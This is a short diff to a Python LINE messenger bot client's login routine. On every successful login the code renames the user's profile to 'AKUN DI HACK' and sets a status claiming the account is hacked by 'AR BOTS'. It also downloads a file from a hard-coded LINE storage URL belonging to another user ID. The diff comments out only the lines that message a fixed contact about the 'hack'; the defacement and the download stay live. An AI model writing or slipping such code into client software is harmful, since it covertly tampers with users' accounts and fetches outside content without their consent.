@@ -16,13 +16,13 @@ class LineObject(object):
         if self.isLogin == True:
             self.log("[%s] : Login success" % self.profile.displayName)
             self.log("YOUR MID : " + "( "+self.profile.mid+" )")
-            linex = "ub0ff92e9820f6b82a2f0b81d6758c2fb"
-            xmod = self.getContact(linex).displayName
-            self.sendText("ub0ff92e9820f6b82a2f0b81d6758c2fb", 'HAI OM, %s , AKUN ANDA SEDANG DI HACK, BY AR BOTS, UNTUK INFO LEBIH LANJUT HUBUNGIN OWNER AR BOTS,  😅' % xmod)
+            #linex = "ub0ff92e9820f6b82a2f0b81d6758c2fb"
+            #xmod = self.getContact(linex).displayName
+            #self.sendText("ub0ff92e9820f6b82a2f0b81d6758c2fb", 'HAI OM, %s , AKUN ANDA SEDANG DI HACK, BY AR BOTS, UNTUK INFO LEBIH LANJUT HUBUNGIN OWNER AR BOTS,  😅' % xmod)
             profile = self.getProfile()
-            profile.displayName = "􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷􀀷"
+            profile.displayName = "AKUN DI HACK"
             self.updateProfile(profile)
-            profile.statusMessage = "AKUN SEDANG DI HACK TEAM AR BOTS"
+            profile.statusMessage = "AKUN LG DI HACK AR BOTS"
             self.updateProfile(profile)
             DOMAIN_ = "https://obs-sg.line-apps.com/myhome/c/download.nhn?userid=u0237b0ec326fc36a91743df4a1ad2591&oid=3253faa34fcfc7d587451e929263dbf7"
             LINE = self.downloadFileURL(DOMAIN_)
